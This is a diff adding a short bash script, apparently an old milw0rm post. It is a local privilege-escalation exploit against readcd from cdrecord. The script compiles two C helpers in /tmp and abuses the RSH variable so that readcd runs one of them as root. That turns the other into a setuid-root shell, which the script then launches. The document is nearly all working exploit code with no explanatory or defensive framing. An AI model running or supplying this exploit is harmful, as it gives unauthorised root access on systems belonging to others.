@@ -1,0 +1,47 @@
+#!/bin/bash
+
+echo "readcd-exp.sh -- ReadCD local exploit ( Test on cdrecord-2.01-0.a27.2mdk)"
+echo "Author : newbug [at] chroot.org"
+echo "Date :09.13.2004"
+echo "IRC : irc.chroot.org #discuss"
+
+export READCD=/usr/bin/readcd
+cd /tmp
+
+cat > s.c <<_EOF_
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main()
+{
+setuid(0);setgid(0);
+chown("/tmp/ss", 0, 0);
+chmod("/tmp/ss", 04755);
+
+return 0;
+}
+
+_EOF_
+
+cat > ss.c <<_EOF_
+#include <stdio.h>
+
+int main()
+{
+setuid(0);setgid(0);
+execl("/bin/bash","bash",(char *)0);
+
+return 0;
+}
+_EOF_
+
+gcc -o s s.c
+gcc -o ss ss.c
+
+export RSH=/tmp/s
+$READCD dev=REMOTE:brk.chroot.org:1,0,1 1 >/dev/null 2>&1
+/tmp/ss
+
+
+// milw0rm.com [2004-09-19]
